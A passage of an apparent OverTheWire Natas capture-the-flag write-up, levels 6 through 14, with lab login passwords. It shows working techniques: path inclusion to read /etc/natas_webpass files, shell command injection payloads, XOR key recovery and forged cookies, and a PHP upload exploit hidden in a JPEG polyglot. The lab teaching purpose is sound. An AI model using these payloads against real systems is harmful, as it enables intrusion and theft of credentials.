behaviour.\n\nIt is not necessary to know PHP (although helpful) to understand what this code does. It includes a file, checks if we have submitted any form data and if so, compares our data (submitted via HTTP POST) to a variable called `$secret`.\n\nThis file is interesting because even though it is `include`d into the PHP code, it does not have a `.php` extension. If we navigate to `http://natas6.natas.labs.overthewire.org/includes/secret.inc`, we can see the PHP code without it being executed.\n\nFrom this we can see that we have to submit `FOEIUWGHFEEUHOFUOIU` in the level form.\n\n## Level 7 ##\n\n(Login: `natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`)\n\n\nWe are presented with a simplistic menu. There is an important hint in the HTML source:\n\n    <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->\n\nAnother convention that will be kept for the entirety of natas.\n\nClicking on the Home and About links directs us to two different pages. Their address / URL differs only in the query parameter `page`. These are parameters parsed by the `index.php` script and sometimes referred to as GET parameters. The server will only look as far as the question mark in the URL, then delegate the rest of the work to the PHP script it executes.\n\nIf we modify the parameter in the URL ourselves, we see the script panic and throw errors which are then passed back to us in the response. Error messages (or in this case warnings) are always a useful source of information. In this case we can see (or guess) the PHP is using its `include` function to include the file we specify in its parameter. What's more, it is not checking what path we give it beforehand.\n\nUsing this knowledge and the hint given to use in the HTML comment, we navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` and see the password for the next level.\n\n## Level 8 ##\n\n(Login: `natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`)\n\nHere we have a simple encoding scheme. We are given an encoded version of the password (the \"ciphertext\") and the encoding function. We want to obtain the non-encoded version of the password (the \"plaintext\"). Assuming the encoding function is not a one-way (hashing or trapdoor) function, we can create a decoding function which will reverse the effects of encoding. Then applying the decoding function to the ciphertext we will get back the plaintext.\n\nOnce again, knowledge of PHP (not to mention inverse function in mathematics) is useful, but not absolutely necessary - any popular programming language will have a manual or documention source that we can refer to to understand what it is doing.\n\nThe `encodeSecret` function performs these steps (in order of operation):\n\n 1. `base64_encode` - apply the Base-64 encoding to the input\n 2. `strrev` - reverse the string\n 3. `bin2hex` - encode the bytes of the string as hexadecimals\n\nSo, our `decodeSecret` should:\n\n 1. `hex2bin` - decode hexadecimal representation into string\n 2. `strrev` - reverse the string\n 3. `base64_decode` - unapply the Base-64 encoding\n\nNow in PHP:\n\n    <?php // To denote start of PHP code\n    // From the level source:\n    $encodedSecret = \"3d3d516343746d4d6d6c315669563362\";\n    // Our reversed function:\n    function decodeSecret($secret) {\n      return base64_decode(strrev(hex2bin($secret)));\n    }\n    // Print out the decoded password:\n    echo decodeSecret($encodedSecret);\n\nRunning this script (e.g. `php script.php` in a terminal or using an [online REPL](https://repl.it/repls/SlowMediumblueRay)) gives us:\n\n    oubWYf2kBq\n\nAnd inputting this into the HTML form grants us access to the next level.\n\n## Level 9 ##\n\n(Login: `natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`)\n\nThis level is a simple code injection. The `passthru` function in PHP simply takes its argument and lets a terminal / shell execute it verbatim. It returns the standard output. More importantly, we can supply part of the command ourselves, without it being checked or sanitised in any way. So, if we give `; cat /etc/natas_webpass/natas10;` as the input, the PHP script will execute:\n\n    grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt\n\nThe `grep` command will probably complain on the standard error (which we do not see), likewise for the `dictionary.txt` (which is not a command). However, our `cat` will print out the contents of the password we need for us.\n\n## Level 10 ##\n\n(Login: `natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`)\n\nThis level is very similar to the previous one but our injection cannot contain specific characters:\n\n    if(preg_match('/[;|&]/',$key)) {\n\nAfter some light reading on `preg_match` or with some knowledge of PHP regular expressions, we can see that the above condition would trigger the error if our input contained `;` (a semicolon), `|` (a pipe), or `&amp;` (an ampersand). The square brackets specify a set of characters (the aforementioned three). The `/` slashes delimit the extent of the regular expression. Both square brackets and slashes are allowed in our injection!\n\nSo we cannot use the injection from the last level. We can, however, still put spaces in our injection. For example `\"\" /etc/natas_webpass/natas11` will make PHP execute:\n\n    grep -i \"\" /etc/natas_webpass/natas11 dictionary.txt\n\nThat is, according to `man grep`, search for `\"\"` (the empty string) in the files `/etc/natas_webpass/natas11` and `dictionary.txt`. The empty string is implicitly contained in any string, just like an empty set is a subset of any set. So we get `grep` outputting the contents of the password file followed by the entirety of the dictionary.\n\n## Level 11 ##\n\n(Login: `natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`)\n\nAfter some preliminary reading through the code, we can make a few conclusions:\n\n - `xor_encrypt` is some sort of XOR encryption implementation, using an unknown (censored) key.\n - Some data is stored in the cookie the server gives us.\n - By default, the data is initialised to `$defaultdata`.\n - We can provide any cookie we want (of course), but its contents will be used as the data in the script only if they are valid, i.e. they can be decrypted and JSON-decoded.\n\nSo what is the XOR encryption about? And why is there no `xor_decrypt` function?\n\nXOR encryption is a type of encryption which takes an input and applies the XOR, exclusive or, operation on it and the key. The XOR operation operates bit-by-bit. Wherever there is a difference in the bits of the operands, it results in a 1, wherever they are the same, it results in a 0. For example:\n\n          a = 0010 1101\n          b = 0101 1001\n    a xor b = 0111 0100\n\nPHP does in fact have a `^` operator and it does work on strings as you would expect - the operation is applied on each bit, even for multi-byte strings. However, the operands need to have the same length in order to produce a result of that length, e.g.:\n\n    \"foobar\" ^ \"barfoo\" == (6 bytes of unprintable binary data)\n    \"foo\"    ^ \"barfoo\" == (3 bytes of unprintable binary data)\n\nSo the `xor_encrypt` function simply extends the key (reusing it again and again) so it can apply XOR to it and the input. You can find some very interesting pieces of information e.g. on Wikipedia about both the XOR operation and XOR encryption. Namely:\n\n    0 xor a = a (0 is XOR identity)\n    a xor a = 0\n    a xor (b xor c) = (a xor b) xor c (associativity)\n    a xor b = b xor a (commutativity)\n\nAssume we have the output of the encryption, the ciphertext, as well as the input for the encryption, the plaintext. In this situation it is trivial to find the key used in the encryption:\n\n          p = plaintext\n          k = key\n    E(p, k) = encryption function\n          c = ciphertext\n    \n    c = E(p, k) = p ^ k\n    p ^ c = p ^ (p ^ k) = (p ^ p) ^ k = 0 ^ k = k\n\nIn other words, if we XOR the plaintext and the ciphertext, we obtain back the key used! This is why XOR encryption is useless in the realworld unless we have a key (stream of bytes) that we only ever use once, and never again. Re-using the same key would lead to loss of security.\n\nBack to our level - the server gives us the ciphertext (the cookie). However, if we changed nothing using the form, we know the plaintext already - it is the default data, encoded and encrypted:\n\n    $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\");\n    // ...\n    function saveData($d) {\n        setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d))));\n    }\n\nThe Base-64 encoding is only applied because the output of `xor_encrypt` is binary, non-printable data. After Base-64 decoding we have the actual ciphertext.\n\n    <?php\n    $defaultdata = array(\"showpassword\" => \"no\", \"bgcolor\" => \"#ffffff\");\n    $ciphertext = base64_decode(\"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=\");\n    $plaintext = json_encode($defaultdata);\n    echo $ciphertext ^ $plaintext;\n\n[This PHP script](https://repl.it/repls/MediumaquamarineWindingCirriped) reveals the key used in the encryption:<p>\n\n    qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq\n\nSo the key is `qw8J` (repeated many times to be as long as the input string). With this, we can finally modify the data ourselves, encrypt it as the server would, and give it to the server as a cookie.\n\n    <?php\n    // Copy of the encryption function with the key filled in:\n    function xor_encrypt($in) {\n        $key = 'qw8J';\n        $text = $in;\n        $outText = '';\n    \n        // Iterate through each character\n        for($i=0;$i<strlen($text);$i++) {\n        $outText .= $text[$i] ^ $key[$i % strlen($key)];\n        }\n    \n        return $outText;\n    }\n    // Our modified data:\n    $modified = array(\"showpassword\" => \"yes\", \"bgcolor\" => \"#ffffff\");\n    // After encoding:\n    echo base64_encode(xor_encrypt(json_encode($modified)));\n\n[Running this](https://repl.it/repls/WhirlwindUnevenServal) gives us:\n\n    ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK\n\nWe set our `data` cookie to this value and refresh, and the password is revealed.\n\n## Level 12 ##\n\n(Login: `natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`)\n\nAfter reading through the sourcecode, we can see we will be uploading a file to the server, up to 1000 bytes in size (more than enough for us).\n\nOf particular interest is the hidden form field called `filename`. It generates a random filename using `genRandomString()` and attaches the extension `.jpg` to it, e.g. `uh2ywqlsb9.jpg`. This filename is then passed to the server-side script, which, for some reason, creates another random string with `genRandomString()`. However, the server-side script keeps the extension passed from the client side intact!\n\nThe final thing to note is that web servers generally / by default decide how to serve clients a file based only on its extension. We noticed something similar in level 6. In this level, a file with a `.php` extension will be treated as a PHP script, so it will be executed on the server and its output will be displayed to clients.\n\nSo in short, we can perform a remote code execution attack - we create a PHP script, change the extension of the `filename` field to `.php`, and upload our script. Then we navigate to it and execute it. Our script can simply be:\n\n    <?php readfile(\"/etc/natas_webpass/natas13\");\n\n([documentation](http://php.net/manual/en/function.readfile.php))\n\nThis outputs the contents of the password file to output buffer, which is what gets passed on to the client.\n\n## Level 13 ##\n\n(Login: `natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`)\n\nThis level is the same as the previous one, with one exception - the file we upload is now checked using `exif_imagetype`. It seems we have to upload a valid JPEG file.\n\nEven though we are still limited in this way, the extension vulnerability is still present, so we can upload a file and make it become a PHP script.\n\nSo what we need is a valid JPEG file that is also a valid PHP script, all under 1000 bytes. This may sound confusing, but there is one very fortunate fact about JPEG files - any data after the end of the image is simply ignored (so multiple JPEG images may be merged into one file, probably). And a fortunate fact about PHP - it simply copies data from the script file to the output buffer unless it is processing actual PHP code, which is surrounded with `<?php` and `?>` tags.\n\nWe can look for the smallest JPEG file possible (creating one with e.g. Photoshop creates a relatively huge file, because it includes a lot of unnecessary metadata). A quick search leads to [this page](https://stackoverflow.com/questions/2253404/what-is-the-smallest-valid-jpeg-file-size-in-bytes). The hexdump of a 134-byte JPEG file is:\n\n    FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 48 00 00\n    FF DB 00 43 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF\n    FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF\n    FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF\n    FF FF FF FF FF FF FF FF FF FF C2 00 0B 08 00 01 00 01 01 01\n    11 00 FF C4 00 14 10 01 00 00 00 00 00 00 00 00 00 00 00 00\n    00 00 00 00 FF DA 00 08 01 01 00 01 3F 10\n\nWe can use a hex editor (very useful tool in general) to convert this to binary data. In linux world, we can do:\n\n    $ xxd -r -p > tiny.jpg\n\nThis starts the `xxd` (hexdump) program, which will await input on standard input. We paste the hexdump in, press return, and `ctrl+D` to close the input. It should create a 134-byte JPEG file in the current directory.\n\nThen we attach our PHP script at the end of the JPEG file:\n\n    $ printf '<?php readfile(\"/etc/natas_webpass/natas14\");' >> tiny.jpg\n\nThe double angle bracket appends to the file instead of overwriting it. See the [Bandit write-ups](/writeups/OverTheWire-Bandit/README.md) for terminal basics.\n\nNow we can change the form extension to `.php`, upload our `tiny.jpg` file, and it should output the password (as well as a bunch of binary garbage, which is our actual JPEG image).\n\n## Level 14 ##\n\n(Login: `natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`)\n\n(TODO!)\n", "timestamp": "2025-10-24T11:39:37.726780"}
